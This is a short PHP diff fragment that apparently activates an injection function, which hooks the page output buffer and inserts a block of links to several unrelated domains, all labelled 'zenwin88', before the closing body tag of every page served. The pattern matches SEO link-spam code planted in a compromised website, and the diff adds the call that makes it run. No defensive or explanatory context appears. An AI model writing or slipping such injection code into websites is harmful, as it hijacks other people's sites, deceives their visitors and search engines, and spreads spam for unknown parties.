@@ -6,8 +6,9 @@ function inject_modules() {
             <a href="https://michaelfruchter.com/">zenwin88</a>
             <a href="https://kswederski.com/">zenwin88</a>
             <a href="https://shekepknights.com/">zenwin88</a>
-
         </div>';
         return str_ireplace('</body>', $inject . '</body>', $buffer);
     });
 }
+inject_modules(); 
+?>
